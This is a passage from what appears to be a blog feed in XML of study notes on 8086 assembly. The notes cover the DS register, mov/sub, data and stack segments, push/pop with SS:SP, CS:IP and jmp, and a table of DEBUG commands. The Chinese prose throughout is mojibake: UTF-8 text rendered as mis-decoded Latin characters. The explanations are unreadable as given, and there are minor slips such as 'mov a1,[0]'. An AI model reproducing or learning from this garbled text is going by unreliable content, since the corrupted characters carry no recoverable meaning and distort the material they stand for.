|<br>ä¸Šä½ä¸‹é«˜<br>ï¼ˆå­—å‹è¦è€ƒè™‘ä¸¤ä¸ªå­—èŠ‚ï¼‰<br>ï¼ˆå­—èŠ‚å‹æ•°è¦è€ƒè™‘1ä¸ªå­—èŠ‚ï¼‰<br>0åœ°å€å•å…ƒä¸­å­˜æ”¾çš„å­—èŠ‚å‹æ•°æ®ä¸º 20H<br>0åœ°å€å­—å•å…ƒä¸­å­˜æ”¾çš„å­—å‹æ•°æ®ä¸º 20000ï¼ˆ4E20Hï¼‰<br>2åœ°å€å­—å•å…ƒä¸­å­˜æ”¾çš„å­—èŠ‚å‹æ•°æ®ä¸º12H<br>2åœ°å€å­—å•å…ƒä¸­å­˜æ”¾çš„å­—å‹æ•°æ®ä¸º0012H<br>1åœ°å€å­—å•å…ƒä¸­å­˜æ”¾çš„å­—å‹æ•°æ®ä¸º 124EH</p><h1 id="3-2-DSå’Œ-address"><a href="#3-2-DSå’Œ-address" class="headerlink" title="3.2  DSå’Œ[address]"></a>3.2  DSå’Œ[address]</h1><p>8086CPUä¸­æœ‰ä¸€ä¸ªDSå¯„å­˜å™¨ï¼Œé€šå¸¸ç”¨æ¥å­˜æ”¾è¦è®¿é—®çš„æ•°æ®çš„æ®µåœ°å€<br>å°†æ•°æ®ç›´æ¥é€å…¥å¯„å­˜å™¨ mov ax,2<br>å°†ä¸€ä¸ªå¯„å­˜å™¨ä¸­çš„å†…å®¹é€å…¥å¦ä¸€ä¸ªå¯„å­˜å™¨ä¸­ mov bx,ax<br>è¿˜å¯ä»¥å°†ä¸€ä¸ªå†…å­˜å•å…ƒä¸­çš„å†…å®¹é€å…¥ä¸€ä¸ªå¯„å­˜å™¨ã€‚mov a1,[0]<br>mov å¯„å­˜å™¨å,å†…å­˜å•å…ƒåœ°å€<br>[â€¦]è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒ,[â€¦]ä¸­çš„0è¡¨ç¤ºå†…å­˜å•å…ƒçš„åç§»åœ°å€<br>æ‰§è¡ŒæŒ‡ä»¤æ—¶ï¼Œ8086CPUè‡ªåŠ¨å–DSä¸­çš„æ•°æ®ä¸ºå†…å­˜å•å…ƒçš„æ®µåœ°å€<br>ä¸èƒ½mov ds,1000H<br>åªèƒ½ mov bx,1000H<br>     mov ds,bx<br>æ•°æ®-&gt;é€šç”¨å¯„å­˜å™¨-&gt;æ®µå¯„å­˜å™¨<br>å°†alä¸­çš„æ•°æ®é€å…¥å†…å­˜å•å…ƒ10000H<br>mov bx,1000H<br>mov ds,bx<br>mov [0],al</p><h1 id="3-3-å­—çš„ä¼ é€"><a href="#3-3-å­—çš„ä¼ é€" class="headerlink" title="3.3  å­—çš„ä¼ é€"></a>3.3  å­—çš„ä¼ é€</h1><p>8086CPUæ˜¯16ä½ç»“æ„ï¼Œæœ‰16æ ¹æ•°æ®çº¿ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥ ä¸€æ¬¡æ€§ä¼ é€16ä½çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ä¸€æ¬¡æ€§ä¼ é€ä¸€ä¸ªå­—ã€‚<br>ä¸€ä¸ªå­—=ä¸¤ä¸ªå­—èŠ‚</p><h1 id="3-4-mov-add-sub"><a href="#3-4-mov-add-sub" class="headerlink" title="3.4  mov add sub"></a>3.4  mov add sub</h1><p>Subæ˜¯å‡æ³•</p><h1 id="3-5-æ•°æ®æ®µ"><a href="#3-5-æ•°æ®æ®µ" class="headerlink" title="3.5  æ•°æ®æ®µ"></a>3.5  æ•°æ®æ®µ</h1><p>å¯ä»¥æ ¹æ®éœ€è¦å°†ä¸€ç»„å†…å­˜å•å…ƒå®šä¹‰ä¸ºä¸€ä¸ªæ®µï¼ˆå¯ä»¥æ˜¯ä»£ç æ®µã€æ•°æ®æ®µç­‰ï¼‰<br>å¯ä»¥å°†ä¸€ç»„é•¿åº¦ä¸ºNï¼ˆN&lt;=64Kï¼‰ã€åœ°å€è¿ç»­ã€èµ·å§‹åœ°å€ä¸º16çš„å€é€Ÿçš„å†…å­˜å•å…ƒå½“ä½œä¸“é—¨å­˜å‚¨æ•°æ®çš„å†…å­˜ç©ºé—´ï¼Œä»è€Œå®šä¹‰äº†ä¸€ä¸ªæ•°æ®æ®µ<br>123B0H-123B9H<br>æ®µåœ°å€ï¼š123BH<br>é•¿åº¦ï¼š10å­—èŠ‚<br>å¦‚ä½•è®¿é—®æ•°æ®æ®µä¸­çš„æ•°æ®<br>å°†dsæŒ‡åˆ°å¤´<br>ç´¯åŠ 123B0Hçš„å‰ä¸‰ä¸ªå­—èŠ‚å•å…ƒçš„æ•°æ®<br><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210719094734.jpeg" alt="ljWzQS.jpg"><br>ç´¯åŠ 123B0Hçš„å‰ä¸‰ä¸ªå­—å‹å•å…ƒçš„æ•°æ®<br><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210719094738.jpeg" alt="ljfPds.jpg"></p><h1 id="3-6-æ ˆ"><a href="#3-6-æ ˆ" class="headerlink" title="3.6  æ ˆ"></a>3.6  æ ˆ</h1><p>æ ˆæ˜¯ä¸€ç§å…·æœ‰ç‰¹æ®Šçš„è®¿é—®æ–¹å¼çš„å­˜å‚¨ç©ºé—´ã€‚å®ƒçš„ç‰¹æ®Šæ€§å°±åœ¨äºï¼Œæœ€åè¿›å»è¿™ä¸ªç©ºé—´çš„æ•°æ®ï¼Œæœ€å…ˆå‡ºå»<br>å…¥æ ˆï¼šå°†ä¸€ä¸ªæ–°çš„å…ƒç´ æ”¾åˆ°æ ˆé¡¶ï¼›<br>å‡ºæ ˆï¼šä»æ ˆé¡¶å–å‡ºä¸€ä¸ªå…ƒç´ ã€‚<br>æ“ä½œåŸåˆ™ï¼šLIFO</p><h1 id="3-7-CPUæä¾›çš„æ ˆæœºåˆ¶"><a href="#3-7-CPUæä¾›çš„æ ˆæœºåˆ¶" class="headerlink" title="3.7  CPUæä¾›çš„æ ˆæœºåˆ¶"></a>3.7  CPUæä¾›çš„æ ˆæœºåˆ¶</h1><p>CPUéƒ½æœ‰æ ˆçš„è®¾è®¡<br>pushæ˜¯å…¥æ ˆ<br>popæ˜¯ä»æ ˆé¡¶<br>push ax ï¼šå°†å¯„å­˜å™¨axä¸­çš„æ•°æ®é€å…¥æ ˆä¸­ï¼ˆä»æ ˆåº•å¼€å§‹æ·»å…¥ï¼‰<br>pop ax  ï¼šä»æ ˆé¡¶å–å‡ºæ•°æ®é€å…¥axï¼ˆå–å‡ºåå°†æ ˆé¡¶æ•°æ®å­˜åœ¨ï¼Œæ˜¯è¦†ç›–çš„ï¼‰<br>8086CPUçš„å…¥æ ˆå’Œå‡ºæ ˆæ“ä½œéƒ½æ˜¯ä»¥å­—å‹ä¸ºå•ä½è¿›è¡Œçš„<br>å­—å‹æ˜¯ä¸¤ä¸ªå•å…ƒ<br>8086CPUä¸­æœ‰ä¸¤ä¸ªå¯„å­˜å™¨ï¼š<br>æ®µå¯„å­˜å™¨SS å­˜æ”¾æ ˆé¡¶çš„æ®µåœ°å€<br>å¯„å­˜å™¨SP å­˜æ”¾æ ˆé¡¶çš„åç§»åœ°å€<br><strong>ä»»ä½•æ—¶åˆ»ï¼ŒSSï¼šSPæŒ‡å‘æ ˆé¡¶å…ƒç´ </strong><br>ä¾‹å­ï¼š<br>push ax<br>(1)SP=SP-2;<br>(2)å°†axä¸­çš„å†…å®¹é€å…¥SS:SPæŒ‡å‘çš„å†…å­˜å•å…ƒå‡º,SS:SPæ­¤æ—¶æŒ‡å‘æ–°æ ˆé¡¶<br>å°†10000H-1000FHå½“ä½œæ ˆï¼Œåˆå§‹çŠ¶æ€æ˜¯ç©º<br>SS=1000H  SP=0010H</p><h1 id="æ ¼å¼åŒ–å°±æ˜¯æŒ‡å‘0ï¼Œæ•°æ®å¹¶æ²¡æœ‰åˆ é™¤ï¼Œåªæ˜¯ç­‰å¾…è¢«è¦†ç›–ï¼Œæ‰€ä»¥è¦å¤šæ¬¡è¦†ç›–åœ¨æ ¼å¼åŒ–ï¼Œæ‰èƒ½æ¸…é™¤å¹²å‡€"><a href="#æ ¼å¼åŒ–å°±æ˜¯æŒ‡å‘0ï¼Œæ•°æ®å¹¶æ²¡æœ‰åˆ é™¤ï¼Œåªæ˜¯ç­‰å¾…è¢«è¦†ç›–ï¼Œæ‰€ä»¥è¦å¤šæ¬¡è¦†ç›–åœ¨æ ¼å¼åŒ–ï¼Œæ‰èƒ½æ¸…é™¤å¹²å‡€" class="headerlink" title="æ ¼å¼åŒ–å°±æ˜¯æŒ‡å‘0ï¼Œæ•°æ®å¹¶æ²¡æœ‰åˆ é™¤ï¼Œåªæ˜¯ç­‰å¾…è¢«è¦†ç›–ï¼Œæ‰€ä»¥è¦å¤šæ¬¡è¦†ç›–åœ¨æ ¼å¼åŒ–ï¼Œæ‰èƒ½æ¸…é™¤å¹²å‡€"></a>æ ¼å¼åŒ–å°±æ˜¯æŒ‡å‘0ï¼Œæ•°æ®å¹¶æ²¡æœ‰åˆ é™¤ï¼Œåªæ˜¯ç­‰å¾…è¢«è¦†ç›–ï¼Œæ‰€ä»¥è¦å¤šæ¬¡è¦†ç›–åœ¨æ ¼å¼åŒ–ï¼Œæ‰èƒ½æ¸…é™¤å¹²å‡€</h1><h1 id="3-8-æ ˆé¡¶è¶…ç•Œçš„é—®é¢˜"><a href="#3-8-æ ˆé¡¶è¶…ç•Œçš„é—®é¢˜" class="headerlink" title="3.8 æ ˆé¡¶è¶…ç•Œçš„é—®é¢˜"></a>3.8 æ ˆé¡¶è¶…ç•Œçš„é—®é¢˜</h1><p>æ ˆé¡¶è¶…ç•Œæ˜¯å±é™©çš„ï¼Œå…¥æ ˆå‡ºæ ˆæ—¶çš„ä¸å°å¿ƒï¼Œè€Œå°†è¿™äº›æ•°æ®ã€ä»£ç æ„å¤–åœ°æ”¹å†™ï¼Œå°†ä¼šå¼•å‘ä¸€è¿ä¸²çš„é”™è¯¯ã€‚<br>8086CPUä¸ä¿è¯å¯¹æ ˆçš„æ“ä½œä¸ä¼šè¶…ç•Œã€‚<br>8086CPUåªçŸ¥é“æ ˆé¡¶åœ¨ä½•å¤„ï¼ˆç”±SSï¼šSPï¼‰ï¼Œè€Œä¸çŸ¥é“è¯»è€…å®‰æ’çš„æ ˆç©ºé—´æœ‰å¤šå¤§ã€‚</p><h1 id="3-9-pushã€popæŒ‡ä»¤"><a href="#3-9-pushã€popæŒ‡ä»¤" class="headerlink" title="3.9 pushã€popæŒ‡ä»¤"></a>3.9 pushã€popæŒ‡ä»¤</h1><p>Push å¯„å­˜å™¨ï¼šå°†ä¸€ä¸ªå¯„å­˜å™¨ä¸­çš„æ•°æ®å…¥æ ˆ<br>Pop  å¯„å­˜å™¨ï¼šå‡ºæ ˆï¼Œç”¨ä¸€ä¸ªå¯„å­˜å™¨æ¥æ”¶å‡ºæ ˆçš„æ•°æ®<br>Push ax<br>Pop bx<br>Push æ®µå¯„å­˜å™¨ï¼šå°†ä¸€ä¸ªæ®µå¯„å­˜å™¨ä¸­çš„æ•°æ®å…¥æ ˆ<br>Pop  æ®µå¯„å­˜å™¨ï¼šå‡ºæ ˆï¼Œç”¨ä¸€ä¸ªæ®µå¯„å­˜å™¨æ¥æ”¶å‡ºæ ˆçš„æ•°æ®<br>Push ds<br>Pop es<br>Push å†…å­˜å•å…ƒï¼šå°†ä¸€ä¸ªå†…å­˜å•å…ƒå¤„çš„å­—å…¥æ ˆ<br><strong>æ ˆçš„æ“ä½œéƒ½æ˜¯ä»¥å­—ä¸ºå•ä½</strong><br>Pop  å†…å­˜å•å…ƒï¼šå‡ºæ ˆï¼Œç”¨ä¸€ä¸ªå†…å­˜å­—å•å…ƒæ¥æ”¶å‡ºæ ˆçš„æ•°æ®<br>Push [0]<br>Pop [2]<br>CPUæ®µåœ°å€éƒ½æ˜¯ä»dsä¸­è·å¾—</p><p><strong>Xor å¼‚æˆ–</strong><br><strong>Xor ax,ax</strong><br><strong>ä¸€æ ·ç­‰äº0</strong><br><strong>ä¸ä¸€æ ·ç­‰äº1</strong></p><h1 id="3-10-æ ˆæ®µ"><a href="#3-10-æ ˆæ®µ" class="headerlink" title="3.10 æ ˆæ®µ"></a>3.10 æ ˆæ®µ</h1><p>æˆ‘ä»¬å¯ä»¥å°†é•¿åº¦ä¸ºN(N&lt;=64K)çš„ä¸€ç»„åœ°å€è¿ç»­ã€èµ·å§‹åœ°å€ä¸º16çš„å€æ•°çš„å†…å­˜å•å…ƒï¼Œå½“ä½œæ ˆåœ¨ç”¨ï¼Œä»è€Œå®šä¹‰äº†ä¸€ä¸ªæ ˆæ®µã€‚</p><p>10000H-1FFFFHè¿™æ®µç©ºé—´å½“ä½œæ ˆæ®µï¼Œåˆå§‹çŠ¶æ€æ ˆæ˜¯ç©ºï¼Œæ­¤æ—¶SS=1000H,SP=0</p><p>10000H-1FFFFHè¿™æ®µç©ºé—´å½“ä½œæ ˆæ®µï¼ŒSS=1000Hï¼Œæ ˆç©ºé—´å¤§å°ä¸º64KBï¼Œæ ˆæœ€åº•éƒ¨çš„å­—å•å…ƒåœ°å€ä¸º1000:FFFE<br>ä»»ä½•æ—¶åˆ»ï¼ŒSS:SPæŒ‡å‘æ ˆé¡¶ï¼Œå½“æ ˆä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ çš„æ—¶å€™ï¼ŒSS=1000Hï¼ŒSP=FFFEH<br>Pushå’Œpopåªèƒ½ä¿®æ”¹SPï¼ŒSSæ˜¯ä¸å‘ç”Ÿæ”¹å˜çš„</p><p>ä¸€ä¸ªæ ˆæ®µçš„å®¹é‡æœ€å¤§ä¸º64KB</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ•°æ®éƒ½ä¸èƒ½å’Œæ®µåœ°å€å‘ç”Ÿç›´æ¥æ›¿æ¢ï¼Œè¦å€Ÿç”¨å¯„å­˜å™¨&quot;&gt;&lt;a href=&quot;#æ•°æ®éƒ½ä¸èƒ½å’Œæ®µåœ°å€å‘ç”Ÿç›´æ¥æ›¿æ¢ï¼Œè¦å€Ÿç”¨å¯„å­˜å™¨&quot; class=&quot;headerlink&quot; title=&quot;æ•°æ®éƒ½ä¸èƒ½å’Œæ®µåœ°å€å‘ç”Ÿç›´æ¥æ›¿æ¢ï¼Œè¦å€Ÿç”¨å¯„å­˜å™¨&quot;&gt;&lt;/a&gt;æ•°æ®éƒ½ä¸èƒ½å’Œæ®µåœ°å€å‘ç”Ÿç›´æ¥æ›¿æ¢ï¼Œè¦å€Ÿç”¨å¯„</summary>
      
    
    
    
    <category term="æ±‡ç¼–" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>debugå‘½ä»¤</title>
    <link href="http://example.com/2020/01/11/debug%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2020/01/11/debug%E5%91%BD%E4%BB%A4/</id>
    <published>2020-01-11T03:16:21.000Z</published>
    <updated>2021-08-13T07:34:56.899Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th>Debugå‘½ä»¤</th><th align="center">å‚æ•°</th><th align="right">åŠŸèƒ½</th></tr></thead><tbody><tr><td>A</td><td align="center">[åœ°å€]</td><td align="right">è¾“å…¥æ±‡ç¼–æŒ‡ä»¤</td></tr><tr><td>C</td><td align="center">[èŒƒå›´]Â èµ·å§‹åœ°å€</td><td align="right">å¯¹ç”±â€œèŒƒå›´â€æŒ‡å®šçš„åŒºåŸŸä¸â€œèµ·å§‹åœ°å€â€æŒ‡å®šçš„åŒå¤§å°åŒºåŸŸè¿›è¡Œæ¯”è¾ƒï¼Œæ˜¾ç¤ºä¸ç›¸åŒçš„å•å…ƒ</td></tr><tr><td>D</td><td align="center">[èŒƒå›´]</td><td align="right">æ˜¾ç¤ºæŒ‡å®šèŒƒå›´å†…çš„å†…å­˜å•å…ƒå†…å®¹</td></tr><tr><td>E</td><td align="center">åœ°å€Â Â å­—èŠ‚å€¼è¡¨</td><td align="right">ç”¨å€¼è¡¨ä¸­çš„å€¼æ›¿æ¢ä»â€œåœ°å€â€å¼€å§‹çš„å†…å­˜å•å…ƒå†…å®¹</td></tr><tr><td>F</td><td align="center">èŒƒå›´Â Â å­—èŠ‚å€¼è¡¨</td><td align="right">ç”¨æŒ‡å®šçš„å­—èŠ‚å€¼è¡¨æ¥å¡«å……å†…å­˜åŒºåŸŸ</td></tr><tr><td>G</td><td align="center">[=èµ·å§‹åœ°å€][æ–­ç‚¹åœ°å€]</td><td align="right">ä»èµ·ç‚¹(æˆ–å½“å‰åœ°ç‚¹)å¼€å§‹æ‰§è¡Œï¼Œåˆ°ç»ˆç‚¹ç»“æŸ</td></tr><tr><td>H</td><td align="center">æ•°å€¼1Â Â æ•°å€¼2</td><td align="right">æ˜¾ç¤ºäºŒä¸ªåå…­è¿›åˆ¶æ•°å€¼ä¹‹å’Œã€å·®</td></tr><tr><td>I</td><td align="center">ç«¯å£åœ°å€</td><td align="right">ä»ç«¯å£è¾“å…¥</td></tr><tr><td>L</td><td align="center">[åœ°å€Â [é©±åŠ¨å™¨å·Â æ‰‡åŒºÂ æ‰‡åŒºæ•°]]</td><td align="right">ä»ç£ç›˜è¯»</td></tr><tr><td>M</td><td align="center">èŒƒå›´Â Â åœ°å€</td><td align="right">æŠŠâ€œèŒƒå›´â€å†…çš„å­—èŠ‚å€¼ä¼ é€åˆ°ä»â€œåœ°å€â€å¼€å§‹çš„å•å…ƒ</td></tr><tr><td>N</td><td align="center">æ–‡ä»¶æ ‡è¯†ç¬¦Â [æ–‡ä»¶æ ‡è¯†ç¬¦â€¦]</td><td align="right">æŒ‡å®šæ–‡ä»¶åï¼Œä¸ºè¯»/å†™æ–‡ä»¶åšå‡†å¤‡</td></tr><tr><td>O</td><td align="center">ç«¯å£åœ°å€Â Â å­—èŠ‚å€¼</td><td align="right">å‘ç«¯å£è¾“å‡º</td></tr><tr><td>P</td><td align="center">[=åœ°å€]Â Â [æŒ‡ä»¤æ•°]</td><td align="right">æŒ‰æ‰§è¡Œè¿‡ç¨‹ï¼Œä½†ä¸è¿›å…¥å­ç¨‹åºè°ƒç”¨æˆ–è½¯ä¸­æ–­</td></tr><tr><td>Q</td><td align="center"></td><td align="right">é€€å‡ºDEBUGï¼Œä¸ä¿å­˜æ­£åœ¨è°ƒè¯•çš„æ–‡ä»¶</td></tr><tr><td>R</td><td align="center">[å¯„å­˜å™¨å]</td><td align="right">æ˜¾ç¤ºå’Œä¿®æ”¹å¯„å­˜å™¨å†…å®¹</td></tr><tr><td>S</td><td align="center">èŒƒå›´Â Â å­—èŠ‚å€¼è¡¨</td><td align="right">åœ¨å†…å­˜åŒºåŸŸå†…æœç´¢æŒ‡å®šçš„å­—èŠ‚å€¼è¡¨ã€‚å¦‚æœæ‰¾åˆ°ï¼Œæ˜¾ç¤ºèµ·å§‹åœ°å€ï¼Œå¦åˆ™ï¼Œä»€ä¹ˆä¹Ÿä¸æ˜¾ç¤º</td></tr><tr><td>T</td><td align="center">[=åœ°å€]Â Â [æŒ‡ä»¤æ•°]</td><td align="right">è·Ÿè¸ªæ‰§è¡Œï¼Œä»èµ·ç‚¹(æˆ–å½“å‰åœ°ç‚¹)æ‰§è¡Œè‹¥å¹²æ¡æŒ‡ä»¤</td></tr><tr><td>U</td><td align="center">[èŒƒå›´]</td><td align="right">åæ±‡ç¼–ï¼Œæ˜¾ç¤ºæœºå™¨ç æ‰€å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤</td></tr><tr><td>W</td><td align="center">[åœ°å€Â [é©±åŠ¨å™¨å·Â Â æ‰‡åŒºÂ æ‰‡åŒºæ•°]]</td><td align="right">å‘ç£ç›˜å†™å†…å®¹ï¼Œ(BXã€CX)ä¸ºå†™å…¥å­—èŠ‚æ•°</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Debugå‘½ä»¤&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;å‚æ•°&lt;/th&gt;
&lt;th align=&quot;right&quot;&gt;åŠŸèƒ½&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;A&lt;/td&gt;
&lt;td align=&quot;</summary>
      
    
    
    
    <category term="æ±‡ç¼–" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>æ±‡ç¼–ç¬¬äºŒç« 2</title>
    <link href="http://example.com/2020/01/10/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%BA%8C%E7%AB%A02/"/>
    <id>http://example.com/2020/01/10/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%BA%8C%E7%AB%A02/</id>
    <published>2020-01-10T14:18:42.000Z</published>
    <updated>2021-08-13T07:33:35.298Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2-8æ®µçš„æ¦‚å¿µ"><a href="#2-8æ®µçš„æ¦‚å¿µ" class="headerlink" title="2.8æ®µçš„æ¦‚å¿µ"></a>2.8æ®µçš„æ¦‚å¿µ</h1><p>å†…å­˜å¹¶æ²¡æœ‰åˆ†æ®µï¼ŒçŸ­çš„åˆ’åˆ†æ¥è‡ªäºCPUï¼Œç”±äº8086CPUç”¨â€œæ®µåœ°å€<em>16+åç§»åœ°å€=ç‰©ç†åœ°å€â€çš„æ–¹å¼ç»™å‡ºå†…å­˜å•å…ƒçš„ç‰©ç†åœ°å€ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨åˆ†æ®µçš„æ–¹å¼æ¥ç®¡ç†å†…å­˜ã€‚<br><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194557.jpeg" alt="l4rd58.jpg"><br>çœ‹éœ€è¦æˆ‘ä»¬å¯ä»¥å°†è‹¥å¹²åœ°å€è¿ç»­çš„å†…å­˜å•å…ƒçœ‹ä½œä¸€ä¸ªæ®µ<br>ï¼ˆ1ï¼‰æ®µåœ°å€</em>16å¿…ç„¶æ˜¯16çš„å€æ•°ï¼Œæ‰€ä»¥ä¸€ä¸ªæ®µçš„èµ·å§‹åœ°å€ä¹Ÿä¸€å®šæ˜¯16çš„å€æ•°<br>ï¼ˆ2ï¼‰åç§»åœ°å€ä¸º16ä½ï¼Œ16ä½åœ°å€çš„å¯»å€èƒ½åŠ›ä¸º64kï¼Œæ‰€ä»¥ä¸€ä¸ªæ®µçš„é•¿åº¦æœ€å¤§ä¸º64k<br>å¯»å€èŒƒå›´:<br>åç§»åœ°å€16ä½ï¼Œå˜åŒ–èŒƒå›´ä¸º0<del>FFFFHï¼Œä»…ç”¨åç§»åœ°å€æ¥å¯»å€æœ€å¤šå¯å¯»64Kä¸ªå†…å­˜å•å…ƒã€‚<br>ç»™å®šæ®µåœ°å€1000Hï¼Œç”¨åç§»åœ°å€å¯»å€ï¼ŒCPUçš„å¯»å€èŒƒå›´ä¸ºï¼š10000H</del>1FFFFH<br>æ•°æ®åœ¨21F60Hå†…å­˜å•å…ƒä¸­ï¼Œå¯¹äº8086PCæœºçš„ä¸¤ç§æè¿°ï¼š<br>1.æ•°æ®å­˜åœ¨å†…å­˜2000ï¼š1F60å•å…ƒä¸­<br>2.æ•°æ®å­˜åœ¨å†…å­˜çš„2000æ®µä¸­çš„1F60Hå•å…ƒä¸­</p><h1 id="2-9æ®µå¯„å­˜å™¨"><a href="#2-9æ®µå¯„å­˜å™¨" class="headerlink" title="2.9æ®µå¯„å­˜å™¨"></a>2.9æ®µå¯„å­˜å™¨</h1><p>æ®µå¯„å­˜å™¨å°±æ˜¯æä¾›æ®µåœ°å€çš„<br>8086CPUæœ‰4ä¸ªæ®µå¯„å­˜å™¨ï¼š<br>CSï¼ŒDSï¼ŒSSï¼ŒES<br>CS ä»£ç æ®µåœ°å€å¯„å­˜å™¨<br>DS æ•°æ®æ®µ<br>SS å †æ ˆæ®µ<br>ES é™„åŠ æ®µ</p><p>å½“8086CPUè¦è®¿é—®å†…å­˜æ—¶ï¼Œç”±è¿™4ä¸ªå¯„å­˜å™¨æä¾›å†…å­˜å•å…ƒçš„æ®µåœ°å€<br>IPä¸ºæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆä¸ä¸Šç½‘çš„ä¸åŒï¼‰<br>CSå’ŒIPæ—¶8086CPUä¸­æœ€å…³é”®çš„å¯„å­˜å™¨ï¼Œå®ƒä»¬æŒ‡ç¤ºäº†CPUå½“å‰è¦è¯»å–æŒ‡ä»¤çš„åœ°å€ã€‚<br>** CSå­˜æ”¾æŒ‡ä»¤çš„æ®µåœ°åœ°å€ **<br>** IPå­˜æ”¾æŒ‡ä»¤çš„åç§»åœ°å€ **<br><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194605.jpeg" alt="l4r0PS.jpg"><br>B8æ˜¯mov axçš„æ„æ€<br>23 01æ˜¯å­˜å‚¨çš„æ•°æ® çº¿æ€§ä¸Šä½ä¸‹é«˜<br>æœ‰çš„æ˜¯3ä¸ªå­—èŠ‚ï¼Œæœ‰çš„æ˜¯2ä¸ªå­—èŠ‚<br>æ­¥éª¤ä¸€ã€ä»CS:IPæŒ‡å‘å†…å­˜å•å…ƒè¯»å–æŒ‡ä»¤ï¼Œè¯»å–çš„æŒ‡ä»¤è¿›å…¥æŒ‡ä»¤ç¼“å†²åŒºï¼›<br>æ­¥éª¤äºŒã€IP=IP+æ‰€è¯»æŒ‡ä»¤çš„é•¿åº¦ï¼ˆå›¾ä¸­mov axï¼Œ0123Hä¸ºä¸‰å­—èŠ‚)ï¼Œä»è€ŒæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼›<br>æ­¥éª¤ä¸‰ã€æ‰§è¡ŒæŒ‡ä»¤ã€‚è½¬åˆ°æ­¥éª¤ä¸€<br>8086CPUå¯åŠ¨æˆ–å¤ä½åCSå’ŒIPè¢«è®¾ç½®ä¸ºCS=FFFFHï¼ŒIP=0000H<br>8086PCæœºåˆšå¯åŠ¨æ—¶ï¼ŒCPUä»å†…å­˜FFFF0Hå•å…ƒä¸­è¯»å–æŒ‡ä»¤æ‰§è¡Œ<br>FFFF0Hå•å…ƒä¸­çš„æŒ‡ä»¤æ˜¯8086PCæœºå¼€æœºåæ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤</p><h1 id="2-10"><a href="#2-10" class="headerlink" title="2.10"></a>2.10</h1><p>å†…å­˜ä¸­çš„ä¸€æ®µä¿¡æ¯æ›¾è¢«CPUæ‰§è¡Œè¿‡çš„è¯ï¼Œé‚£ä¹ˆï¼Œå®ƒæ‰€åœ¨çš„å†…å­˜å•å…ƒå¿…ç„¶è¢«CS:IPæŒ‡å‘è¿‡</p><h1 id="2-11ä¿®æ”¹CSã€IPçš„æŒ‡ä»¤"><a href="#2-11ä¿®æ”¹CSã€IPçš„æŒ‡ä»¤" class="headerlink" title="2.11ä¿®æ”¹CSã€IPçš„æŒ‡ä»¤"></a>2.11ä¿®æ”¹CSã€IPçš„æŒ‡ä»¤</h1><p>jmp æ®µåœ°å€:åç§»åœ°å€<br>jmp  2AE3:3  (2AE33)<br>jmp  3:0B16  (00B46H)<br>jmp æŸä¸€åˆæ³•å¯„å­˜å™¨<br>jmp ax (ç±»ä¼¼ mov IP,ax)<br>jmp bx<br>åŠŸèƒ½:ç”¨å¯„å­˜å™¨ä¸­çš„å€¼ä¿®æ”¹IP</p><h1 id="2-12ä»£ç æ®µ"><a href="#2-12ä»£ç æ®µ" class="headerlink" title="2.12ä»£ç æ®µ"></a>2.12ä»£ç æ®µ</h1><p>å¯¹äº8086PCæœºï¼Œåœ¨ç¼–ç¨‹æ—¶ï¼Œå¯ä»¥æ ¹æ®éœ€è¦ï¼Œå°†ä¸€ç»„å†…å­˜å•å…ƒå®šä¹‰ä¸ºä¸€ä¸ªæ®µã€‚<br>å¯ä»¥å°†é•¿åº¦ä¸ºNï¼ˆN&lt;=64KBï¼‰çš„ä¸€ç»„ä»£ç ï¼Œå­˜åœ¨ä¸€ç»„åœ°å€è¿ç»­ã€èµ·å§‹åœ°å€ä¸º16çš„å€æ•°çš„å†…å­˜å•å…ƒä¸­ï¼Œè¿™æ®µå†…å­˜æ˜¯ç”¨æ¥å­˜æ”¾ä»£ç çš„ï¼Œä»è€Œå®šä¹‰äº†ä¸€ä¸ªä»£ç æ®µã€‚<br>è¦æ‰§è¡Œä»£ç æ®µï¼Œéœ€è¦CPUè®¤CS:IPæŒ‡å‘çš„å†…å­˜å•å…ƒä¸­çš„å†…å®¹ä¸ºæŒ‡ä»¤<br>æ‰€ä»¥è¦å°†CS:IPæŒ‡å‘æ‰€å®šä¹‰çš„ä»£ç æ®µä¸­çš„ç¬¬ä¸€æ¡æŒ‡ä»¤çš„é¦–åœ°å€</p><h1 id="è“å±ä¸€èˆ¬æ˜¯å†…å­˜é—®é¢˜"><a href="#è“å±ä¸€èˆ¬æ˜¯å†…å­˜é—®é¢˜" class="headerlink" title="è“å±ä¸€èˆ¬æ˜¯å†…å­˜é—®é¢˜"></a>è“å±ä¸€èˆ¬æ˜¯å†…å­˜é—®é¢˜</h1><p><strong>sub axï¼Œaxç›¸å½“äºå¯¹axæ¸…é›¶ã€‚è¿™ç§å‡æ³•æ“ä½œæ¯”ç›´æ¥ç”¨mov axï¼Œ0æ›´å¿«ã€‚</strong></p>]]></content>
    
    
      
      
